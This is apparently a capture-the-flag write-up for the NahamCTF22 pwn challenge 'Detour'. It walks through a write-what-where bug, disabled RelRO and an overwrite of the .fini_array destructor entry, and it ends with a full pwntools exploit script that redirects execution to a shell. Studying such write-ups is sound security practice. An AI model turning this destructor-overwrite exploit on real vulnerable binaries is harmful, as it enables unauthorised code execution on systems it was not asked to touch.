---
title:  "Detour"
date:  2022-05-01
draft:  false
enableToc:  false
description: "A write-what-where scenario that enables us to overwrite the destructor (dtor) in the relocations table with our win() function to get a shell."
tags:
- pwn
- NahamCTF22
---

## Checksec
```
Canary                        : ✓
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : ✘
```
RelRO is completely disabled unlike any other challenge we have encountered, this means that we have write permessions to all the relocations.

## Exploitation
Running the binary will let us specify an address and a value and then It will assign that value to the adderss we provided.

```
hegz@pop-os$ ./detour
What: 1234
Where: 123123123213
Segmentation fault (core dumped)
```

I confirmed this by analyzing the binary in ghidra, below is the decompilation.

```c++
undefined8 main(void)

{
  long in_FS_OFFSET;
  size_t local_20;
  long local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);

  printf("What: ");
  __isoc99_scanf(&DAT_00402013,&local_20);
  getchar();

  printf("Where: ");
  __isoc99_scanf(&DAT_0040201f,&local_18);
  getchar();

  *(size_t *)((long)&base + local_18) = local_20;

  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

This is the part responsible of the write-what-where.
```c
*(size_t *)((long)&base + local_18) = local_20;
```

It basically means that It will write the value we provide in `local_20` at the address we provide at `local_18` incremented by the address of `base`, this is important when crafting our exploit as we have to subtract the address of base from the address we provide to get the correct address in the binary.

We also have a function that will execute a shell in our binary.
```c++
void win(void)

{
  system("/bin/sh");
  return;
}
```

Now we only need to locate the address that we will be writing to in order to redirect execution to our win() function.

The GOT is one good attack vector but we don't call any libc function (except __stack_chk_fail) after our write-what-where, this means that overwriting the GOT is useless since the overwritten GOT entry will never be referenced anyway.

The less obvious attack vector is the global destructor for our program, this is possible due the fact that we have write permissions to the binary relocations.

The global destructor is a routine that gets called when our main function is exiting.

Here is the backtrace of the binary after successfully ovewrwriting the global destructor.

```c++
[#0] 0x7ffff7e5c6ea → __GI___wait4(pid=0xddb6b, stat_loc=0x7fffffffd8d8, options=0x0, usage=0x0)
[#1] 0x7ffff7e5c6ab → __GI___waitpid(pid=<optimized out>, stat_loc=0x7fffffffd8d8, options=0x0)
[#2] 0x7ffff7dc394b → do_system(line=<optimized out>)
[#3] 0x40121d → win()
[#4] 0x7ffff7fd9f03 → _dl_fini()
[#5] 0x7ffff7db84e5 → __run_exit_handlers(status=0x0, listp=0x7ffff7f8c818 <__exit_funcs>, run_list_atexit=0x1, run_dtors=0x1)
[#6] 0x7ffff7db8660 → __GI_exit(status=<optimized out>)
[#7] 0x7ffff7d9cfd7 → __libc_start_call_main(main=0x401220 <main>, argc=0x1, argv=0x7fffffffde88)
[#8] 0x7ffff7d9d07d → __libc_start_main_impl(main=0x401220 <main>, argc=0x1, argv=0x7fffffffde88, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffde78)
[#9] 0x40111e → _start()
```

It is present in the .fini_array section under the symbol name `__do_global_dtors_aux_fini_array_entry`

Time to craft our exploit.

```python
from pwn import *

context.binary = e = ELF("./detour")
context.encoding = 'latin'

if args['REMOTE']:
    io = remote("challenge.nahamcon.com", 32149)
elif args['GDB']:
    # Breaks at RTN instruction.
    io = gdb.debug(context.binary.path, f"""
    b *main+143
""")
else:
    io = e.process()

what = str(e.symbols.win)
where = str(e.sym.__do_global_dtors_aux_fini_array_entry - e.sym.base)
info(f"Overwriting: {where} with {what}")

io.clean(1)
io.sendline(what)
io.clean(1)
io.sendline(where)
io.interactive()
```

<center>

![](/images/mc/ach_shell.png)

</center>
